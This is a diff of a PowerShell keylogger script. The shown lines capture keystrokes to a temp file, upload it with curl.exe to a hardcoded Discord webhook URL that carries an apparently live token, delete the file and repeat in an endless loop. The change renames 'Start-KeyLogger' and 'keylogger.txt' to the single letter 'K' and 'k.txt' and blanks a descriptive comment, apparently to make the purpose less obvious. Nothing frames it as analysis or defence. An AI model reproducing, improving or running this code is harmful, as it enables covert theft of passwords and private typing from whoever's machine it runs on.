@@ -1,4 +1,4 @@
-function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
+function K($Path="$env:temp\k.txt") 
 {
   # Signatures for API Calls
   $signatures = @'
@@ -50,7 +50,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
           if ($success) 
           {
-            # add key to logger file
+            # 
             [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
 	    $d = Get-Date -Format %s
           }
@@ -64,12 +64,12 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 	
     $hookUrl = 'https://discord.com/api/webhooks/1130234959148359771/Qn5KRieuzWJHcn4MTezMzadO4mt6uRAGkt40RdRTQ7rojQvzHIfKVC83p-DV6eqYYSj7'
 	
-    curl.exe -F 'file1=@keylogger.txt' $hookurl -o nul
+    curl.exe -F 'file1=@k.txt' $hookurl -o nul
     
     Start-Sleep -Milliseconds 50
 	    
-    Remove-Item $env:temp\keylogger.txt
+    Remove-Item $env:temp\k.txt
    }
 }
  
-While($true){ &Start-KeyLogger}
+While($true){ &K}
